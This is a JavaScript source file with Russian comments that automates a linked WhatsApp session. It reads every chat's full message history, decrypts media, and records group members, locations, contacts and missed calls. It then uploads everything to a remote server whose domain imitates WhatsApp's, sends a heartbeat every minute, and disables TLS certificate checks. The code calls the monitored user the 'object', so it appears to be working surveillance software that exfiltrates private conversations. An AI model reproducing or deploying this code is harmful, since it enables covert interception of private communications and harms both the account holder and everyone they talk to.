const { decryptMedia } = require("@open-wa/wa-automate");
const request = require("request-promise");
const fetch = require("node-fetch");
const mime = require("mime-types");
const fs = require("fs");

// для того, чтобы можно было отправлять запросы на сервер с самоподписанным сертификатом
process.env.NODE_TLS_REJECT_UNAUTHORIZED = 0;

// Возвращает дату в формате YYYY-MM-DD hh:mm:ss
if (!Date.prototype.toLString) {
  (function () {
    function pad(number) {
      if (number < 10) {
        return "0" + number;
      }
      return number;
    }

    Date.prototype.toLString = function () {
      return (
        this.getFullYear() +
        "-" +
        pad(this.getMonth() + 1) +
        "-" +
        pad(this.getDate()) +
        " " +
        pad(this.getHours()) +
        ":" +
        pad(this.getMinutes()) +
        ":" +
        pad(this.getSeconds())
      );
    };
  })();
}

//Обработка клиента :)
class Parser {
  constructor(io) {
    this.io = io;
    this.messenger = "0";
    this.skipChat = false;
    this.skipObject = false;
    // this.listenSocketEvents();
  }

  async start(client, number, idOtm) {
    this.number = number;
    this.idOtm = idOtm;
    this.client = client;
    this.hostDevice = await this.client.getMe();
    this.hostNumber = this.hostDevice.me.user;
    this.sendActives(this.hostNumber, "0");

    console.log(`${this.hostNumber} - started parser\n`);

    //Подписка на новые сообщения
    this.client.onAnyMessage(async (message) => {
      // chatmembers = null, так как нужно при получении новых сообщений уточнить участников чата, т.к. они могут поменятся
      await this.parseMsg(message, null);
    });

    let chats = await this.client.getAllChats();

    for (const Chat of chats) {
      if (this.skipObject === true) {
        this.skipObject = false;
        break;
      }
      // получаем все сообщения чата
      let messages = await this.client.loadAndGetAllMessagesInChat(
        Chat.id,
        true,
        true
      );
      messages.reverse();
      // получаем информацию о чате
      const chatmembers = await this.parseChatMembers(
        Chat.id,
        Chat.name,
        Chat.contact,
        Chat.isGroup
      );

      this.io.emit("messanges", "MSG_NUMS", {
        id: idOtm,
        countMsg: messages.length,
        chat: Chat.name,
      });
      let count = 0;

      for (const Message of messages) {
        if (this.skipChat === true) break;
        await this.parseMsg(Message, chatmembers);
        // console.log(Message.body);
        this.io.emit("messanges", "MSG_COUNT", {
          id: idOtm,
          numberMsg: ++count,
        });
      }
      this.skipChat = false;
    }

    this.io.emit("messanges", "FINISH_PARSE", {
      id: idOtm,
    });

    //Оповещение, если пользователь открыл еще одну сессию в web
    // this.client.onStateChanged((state) => {
    //   let datetime = new Date();
    //   console.log(
    //     `_____________________________________________\n${datetime.toLocaleString()}\n!!!!!STATE CHANGED!!!!!`,
    //     state
    //   );
    //   /*if (state === "CONFLICT") client.forceRefocus();*/
    // });
  }

  async parseMsg(message, chatMembersOld) {
    // console.log("-----------------------------------------------------------");
    // console.log(message.body);
    // получаем участников чата для новых сообщений, если в группах изменились участники
    const chatMembers =
      chatMembersOld === null
        ? await this.parseChatMembers(
            message.chat.id,
            message.chat.name,
            message.chat.contact,
            message.chat.isGroup
          )
        : chatMembersOld;
    let msg = {
      chatmembers: chatMembers,
      mid: this.genId(message.id),
      sender: this.getSenderReciver(message),
      datetime: new Date(message.timestamp * 1000).toLString(),
      fileName: "",
    };
    let Media;
    let fileName;
    if (message.type === "chat") {
      msg.type = "Сообщение";
      msg.text = message.body;
    } else if (message.mimetype) {
      fileName = `w_${message.t}.${mime.extension(message.mimetype)}`;
      Media = await this.getMedia(message, fileName);
      Media ? (msg.filename = fileName) : (msg.filename = "");
      msg.type = "Медиафайл";
      message.caption
        ? (msg.text = "[Медиафайл] " + message.caption)
        : (msg.text = "[Медиафайл]");
    } else if (message.type === "location") {
      msg.type = "Местоположение";
      msg.text = `[${message.lat}, ${message.lng}]\n${
        message.loc ? message.loc : ""
      }`;
    } else if (message.type === "vcard") {
      msg.type = "Контакт";
      msg.text = `${
        message.vcardFormattedName ? message.vcardFormattedName : ""
      }\n${message.body ? message.body : ""}`;
    } else if (message.type === "call_log") {
      msg.type = "Звонок";
      msg.text = `[ПРОПУЩЕНЫЙ ЗВОНОК]`;
    }

    if (typeof msg.type != "undefined") {
      await this.sleep(10);
      // console.log(msg.text);
      await this.sendMsg(msg, this.number, this.hostDevice);
      if (msg.filename) {
        await this.sleep(10);
        await this.sendMedia(Media, fileName, this.number, this.hostDevice);
      }
    }
  }

  getSenderReciver(message) {
    let sender;
    if (message.fromMe) {
      sender = "ИСХ";
    } else {
      sender = message.chat.isGroup ? "ВХ от " + this.getAuthor(message) : "ВХ";
    }
    return sender;
  }

  // Отправка сообщения на сервер возвращет 0 если отправка успешна
  async sendMsg(msg, number, hostDevice) {
    msg.number = this.hostNumber;
    msg.messenger = this.messenger;

    fetch("https://loger.whatsapp.net/whatsApp/mtext_wr_whatsApp.php", {
      method: "POST",
      body: JSON.stringify(msg),
      headers: {
        "Content-Type": "application/json",
      },
    })
      .then((res) => res.text())
      .then((data) => {
        this.checkAnswer(data);
      })
      .catch(function (err) {
        // console.log(err);
        const text = `Upload failed: ${err}`;
        Parser.whriteLog(
          number,
          hostDevice,
          text + ": " + JSON.stringify(options.form)
        );
      });
  }

  checkAnswer(data, msg = null) {
    // console.log(data, " - ответ от сервера");
    // если сообщение есть в бд приходит ответ 1, тогда пропускаем чат и переходим к следующему
    if (Number(data) === 1) this.skipChat = true;
    if (Number(data) === 2) this.skipObject = true;
    if (Number(data) === 3) {
      Parser.whriteLog(
        this.number,
        this.hostDevice,
        msg,
        "DATA NOT WRITED IN DB ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! !"
      );
    }
  }

  // Отправка медиа на сервер
  async sendMedia(Media, filename, number, hostDevice) {
    let req = request.post(
      "https://loger.whatsapp.net/mfile_wr.php",
      { rejectUnauthorized: false },
      function (err, resp, body) {
        if (err) {
          Parser.whriteLog(
            number,
            hostDevice,
            `${filename} - ERROR write on server!`,
            body
          );
        } else {
          Parser.whriteLog(
            number,
            hostDevice,
            `The file " + ${filename} + " was saved!`,
            body
          );
        }
      }
    );
    let form = req.form();
    form.append("file", Media, {
      filename: filename,
      contentType: "text/plain",
    });
  }

  //Отправка активности
  sendActives() {
    function sendActive() {
      let datetime = new Date();
      let req = request.post(
        "https://loger.whatsapp.net/active.php",
        { rejectUnauthorized: false },
        function (err, resp, body) {
          if (err) {
            console.log("Error!");
          } /*else {
                    console.log(`_____________________________________________\n${datetime.toLocaleString()}\nTickTock, mthfckr`);
                }*/
        }
      );
      let form = req.form();
      form.append("number", this.hostNumber || "");
      form.append("messenger", this.messenger || "");
    }

    setInterval(sendActive.bind(this), 60000);
  }

  // Определение автора входящего сообщения в группе
  getAuthor(msg) {
    let author;
    msg.isGroupMsg && !msg.fromMe
      ? (author = msg.author.substring(0, msg.author.indexOf("@")))
      : (author = "");
    return author;
  }

  // Генерация Id сообщения
  genId(str, asString, seed) {
    var i,
      l,
      hval = seed === undefined ? 0x811c9dc5 : seed;

    for (i = 0, l = str.length; i < l; i++) {
      hval ^= str.charCodeAt(i);
      hval +=
        (hval << 1) + (hval << 4) + (hval << 7) + (hval << 8) + (hval << 24);
    }
    if (asString) {
      return ("0000000" + (hval >>> 0).toString(16)).substr(-8);
    }
    return hval >>> 0;
  }

  // Возвращает участников группы или чата
  async parseChatMembers(chatId, chatName, chatContact, isGroup) {
    let contacts,
      arr = [],
      chatmembers,
      numbr,
      name,
      pushname,
      formattedName;

    if (isGroup) {
      contacts = await this.client.getGroupMembers(chatId);
      for (let i = 0; i < contacts.length; i++) {
        numbr = contacts[i].id.substring(0, contacts[i].id.indexOf("@"));
        name = contacts[i].name ? contacts[i].name + "/" : "";
        pushname = contacts[i].pushname ? contacts[i].pushname : "";
        formattedName = contacts[i].formattedName === "Вы" ? "Объект" : "";
        let chatmember = numbr + "-" + name + pushname + formattedName;
        arr[i] = chatmember;
      }
      chatmembers = "[Группа]" + chatName + ":(" + arr.join("; ") + ")";
    } else {
      numbr = chatContact.id.substring(0, chatContact.id.indexOf("@"));
      name = chatContact.name ? chatContact.name + " " : "";
      pushname = chatContact.pushname ? chatContact.pushname : "";
      chatmembers = numbr + "-" + name + pushname;
    }
    return chatmembers;
  }

  // Задержка
  async sleep(ms) {
    return new Promise((res) => setTimeout(res, ms));
  }

  // Получение медиафайлов
  async getMedia(message, filename) {
    try {
      const mediaData = await decryptMedia(message); //forceStaleMediaUpdate(message.id);//
      /*const imageBase64 = `data:${message.mimetype};base64,${mediaData.toString(
                'base64'
            )}`;*/

      /*fs.writeFile(filename, mediaData, function (err) {
                if (err) {
                    return console.log(err);
                }
                console.log('The file ' + filename + ' was saved!');
            });*/
      return mediaData;
    } catch (e) {
      Parser.whriteLog(
        this.number,
        this.hostDevice,
        `Ошибка ${e.name} : ${e.message}`
      );
    }
  }

  static whriteLog(number, hostDevice, msg, body = "") {
    let datetime = new Date();
    fs.appendFileSync(
      `logs/${number}/${hostDevice.me.user}.log`,
      `${datetime.toLocaleString()} [${msg}] ${body}\n`
    );
  }
}

module.exports = Parser;
